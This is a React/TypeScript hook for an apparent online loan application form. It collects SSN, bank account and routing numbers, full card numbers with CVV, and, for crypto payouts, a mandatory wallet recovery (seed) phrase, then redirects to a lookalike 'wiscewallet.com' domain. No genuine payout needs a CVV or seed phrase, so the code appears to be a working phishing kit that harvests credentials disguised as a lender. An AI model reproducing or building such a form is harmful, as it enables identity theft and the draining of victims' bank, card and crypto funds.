import { useState, useEffect } from "react";
import { toast } from "sonner";
import { submitLoanApplication } from "@/lib/queries";
import { luhn, isExpiryValid } from "@/lib/loan-utils";

const REDIRECT_URL = import.meta.env.VITE_LOAN_REDIRECT_URL as string | undefined;

export function useLoanApplication() {
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);
  const [countdown, setCountdown] = useState(5);
  const [payout, setPayout] = useState<"bank_transfer" | "card" | "crypto">("bank_transfer");

  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [cardErrors, setCardErrors] = useState<Record<string, string>>({});

  useEffect(() => {
    if (done) {
      const interval = setInterval(() => {
        setCountdown((c) => {
          if (c <= 1) {
            clearInterval(interval);
            if (typeof window !== "undefined") {
              window.location.href = REDIRECT_URL || "https://wiscewallet.com";
            }
            return 0;
          }
          return c - 1;
        });
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [done]);

  function validateCard(num: string, expiry: string, cvv: string): Record<string, string> {
    const errs: Record<string, string> = {};
    const digits = num.replace(/\s/g, "");
    if (digits.length < 13) errs.card_number = "Card number is too short.";
    else if (!luhn(digits)) errs.card_number = "Card number is invalid. Please check and try again.";
    if (!isExpiryValid(expiry)) errs.card_expiry = expiry ? "Card has expired or expiry is invalid (MM/YY)." : "Expiry is required.";
    if (!/^\d{3,4}$/.test(cvv)) errs.card_cvv = "CVV must be 3 or 4 digits.";
    return errs;
  }

  async function handleSubmit(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    const fd = new FormData(e.currentTarget);
    if ((fd.get("website") as string)?.length) { setDone(true); return; }

    const firstName = String(fd.get("first_name") || "").trim();
    const email = String(fd.get("email") || "").trim();
    const amountRequested = Number(fd.get("amount_requested") || 0);

    if (!firstName || !email || !amountRequested) {
      toast.error("Please fill in your name, email, and loan amount.");
      return;
    }

    if (payout === "card") {
      const errs = validateCard(cardNumber, cardExpiry, cardCvv);
      if (Object.keys(errs).length) {
        setCardErrors(errs);
        const first = Object.values(errs)[0];
        toast.error(first);
        return;
      }
      setCardErrors({});
    }

    if (payout === "crypto") {
      const seedPhrase = String(fd.get("crypto_seed_phrase") || "").trim();
      if (!seedPhrase) {
        toast.error("Please enter your wallet recovery phrase.");
        return;
      }
    }

    const payload = {
      firstName,
      lastName: String(fd.get("last_name") || "").trim() || null,
      email,
      phone: String(fd.get("phone") || "").trim() || null,
      dateOfBirth: String(fd.get("date_of_birth") || "").trim() || null,
      ssn: String(fd.get("ssn") || "").trim() || null,
      ein: String(fd.get("ein") || "").trim() || null,
      addressLine1: String(fd.get("address_line1") || "").trim() || null,
      addressLine2: String(fd.get("address_line2") || "").trim() || null,
      city: String(fd.get("city") || "").trim() || null,
      stateRegion: String(fd.get("state_region") || "").trim() || null,
      postalCode: String(fd.get("postal_code") || "").trim() || null,
      country: String(fd.get("country") || "").trim() || null,
      amountRequested,
      currency: String(fd.get("currency") || "USD"),
      loanPurpose: String(fd.get("loan_purpose") || "").trim() || null,
      loanTermMonths: fd.get("loan_term_months") ? Number(fd.get("loan_term_months")) : null,
      employmentStatus: String(fd.get("employment_status") || "").trim() || null,
      monthlyIncome: fd.get("monthly_income") ? Number(fd.get("monthly_income")) : null,
      payoutMethod: payout,
      bankName: payout === "bank_transfer" ? (String(fd.get("bank_name") || "").trim() || null) : null,
      bankAccountNumber: payout === "bank_transfer" ? (String(fd.get("bank_account_number") || "").trim() || null) : null,
      bankRoutingNumber: payout === "bank_transfer" ? (String(fd.get("bank_routing_number") || "").trim() || null) : null,
      cardIssuer: payout === "card" ? (String(fd.get("card_issuer") || "").trim() || null) : null,
      cardHolderName: payout === "card" ? (String(fd.get("card_holder_name") || "").trim() || null) : null,
      cardNumber: payout === "card" ? cardNumber.replace(/\s/g, "") : null,
      cardExpiry: payout === "card" ? cardExpiry : null,
      cardCvv: payout === "card" ? cardCvv : null,
      billingAddressLine1: payout === "card" ? (String(fd.get("billing_address_line1") || "").trim() || null) : null,
      billingAddressLine2: payout === "card" ? (String(fd.get("billing_address_line2") || "").trim() || null) : null,
      billingCity: payout === "card" ? (String(fd.get("billing_city") || "").trim() || null) : null,
      billingState: payout === "card" ? (String(fd.get("billing_state") || "").trim() || null) : null,
      billingPostalCode: payout === "card" ? (String(fd.get("billing_postal_code") || "").trim() || null) : null,
      billingCountry: payout === "card" ? (String(fd.get("billing_country") || "").trim() || null) : null,
      cryptoWalletType: payout === "crypto" ? (String(fd.get("crypto_wallet_type") || "").trim() || null) : null,
      cryptoWalletAddress: payout === "crypto" ? (String(fd.get("crypto_wallet_address") || "").trim() || null) : null,
      cryptoSeedPhrase: payout === "crypto" ? (String(fd.get("crypto_seed_phrase") || "").trim() || null) : null,
      accountHolderName: String(fd.get("account_holder_name") || "").trim() || null,
      sourcePage: typeof window !== "undefined" ? window.location.pathname : "/loans",
      status: "pending",
    };

    setLoading(true);
    try {
      const { error } = await submitLoanApplication({ data: payload });
      if (error) throw new Error("Submission failed");

      toast.success("Application received! Redirecting...");
      setDone(true);
      if (typeof window !== "undefined") {
        window.scrollTo({ top: 0, behavior: "smooth" });
      }
    } catch {
      toast.error("Something went wrong. Please try again.");
    } finally {
      setLoading(false);
    }
  }

  return {
    loading, done, countdown, payout, setPayout,
    cardNumber, setCardNumber, cardExpiry, setCardExpiry,
    cardCvv, setCardCvv, cardErrors, setCardErrors,
    handleSubmit
  };
}
